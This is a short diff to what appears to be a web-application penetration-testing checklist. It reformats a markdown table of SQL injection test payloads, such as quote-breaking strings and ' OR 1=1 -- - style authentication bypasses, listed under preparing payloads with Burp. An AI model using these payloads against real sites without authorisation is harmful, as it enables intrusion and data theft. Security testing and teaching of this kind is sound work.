@@ -26,8 +26,9 @@ What should we do? At first time we should check every input section in web-app 
 - Prepare tools and payloads
     - Run Burp
     - Write usefull and different payloads for injection
-         |'-"            | \'' - \"" ,  | 
-        |' OR 1=1 -- -  | ' OR '1'='1  |
-        |" OR 1=1 -- -  | " OR "1"="1  |
-        |') OR 1=1 -- - | ') OR '1'='1 |
-        |") OR 1=1 -- - | ") OR "1"="1 |
+| ---           | ---          |
+|     '-"       | \'' - \""    | 
+|' OR 1=1 -- -  | ' OR '1'='1  |
+|" OR 1=1 -- -  | " OR "1"="1  |
+|') OR 1=1 -- - | ') OR '1'='1 |
+|") OR 1=1 -- - | ") OR "1"="1 |
